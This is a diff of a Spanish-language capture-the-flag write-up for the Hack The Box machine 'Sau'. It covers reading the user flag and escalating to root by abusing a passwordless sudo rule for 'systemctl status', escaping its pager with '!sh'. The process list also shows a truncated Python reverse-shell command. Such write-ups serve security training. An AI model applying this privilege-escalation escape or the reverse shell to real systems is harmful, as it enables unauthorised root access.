@@ -155,15 +155,66 @@ Running exploit on http://10.129.229.26:55555/hptdoh/login
 ```bash
 puma@sau:/opt/maltrail$ whoami
 puma
+puma@sau:/opt/maltrail$ cd $home
+puma@sau:~$ ls
+user.txt
+puma@sau:~$ cat user.txt 
+04a05cb265e47260...
 ```
 
+# Escalada de privilegios
 
+Comenzaremos por ejecutar el comando `sudo -l` para ver si el usuario tiene algún tipo de privilegio:
 
+```bash
+puma@sau:~$ sudo -l
+Matching Defaults entries for puma on sau:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
+User puma may run the following commands on sau:
+    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
+```
 
+Solo tenemos permiso para ese comando, dicho comando ejecuta un pager, invocamos una shell:
 
+```bash
+puma@sau:~$ sudo /usr/bin/systemctl status trail.service
+● trail.service - Maltrail. Server of malicious traffic detection system
+     Loaded: loaded (/etc/systemd/system/trail.service; enabled; vendor preset:>
+     Active: active (running) since Wed 2026-06-17 11:08:02 UTC; 3h 52min ago
+       Docs: https://github.com/stamparm/maltrail#readme
+             https://github.com/stamparm/maltrail/wiki
+   Main PID: 892 (python3)
+      Tasks: 12 (limit: 4662)
+     Memory: 29.7M
+     CGroup: /system.slice/trail.service
+             ├─ 892 /usr/bin/python3 server.py
+             ├─1317 /bin/sh -c logger -p auth.info -t "maltrail[892]" "Failed p>
+             ├─1319 /bin/sh -c logger -p auth.info -t "maltrail[892]" "Failed p>
+             ├─1322 sh
+             ├─1328 python3 -c import socket,os,pty;s=socket.socket(socket.AF_I>
+             ├─1329 /bin/sh
+             ├─1330 script /dev/null -c bash
+             ├─1331 bash
+             ├─1420 sudo /usr/bin/systemctl status trail.service
+             ├─1421 /usr/bin/systemctl status trail.service
+             └─1422 pager
 
+Jun 17 11:08:02 sau systemd[1]: Started Maltrail. Server of malicious traffic d>
+Jun 17 14:45:10 sau sudo[1348]:     puma : TTY=pts/1 ; PWD=/home/puma ; USER=ro>
+!sh
+# whoami
+root
+```
 
-[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/513)
+Y así conseguimos `root`:
+
+```bash
+root@sau:/home/puma# cat /root/root.txt 
+533a110bd26ccf497...
+```
+
+[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/551)
 
 ---
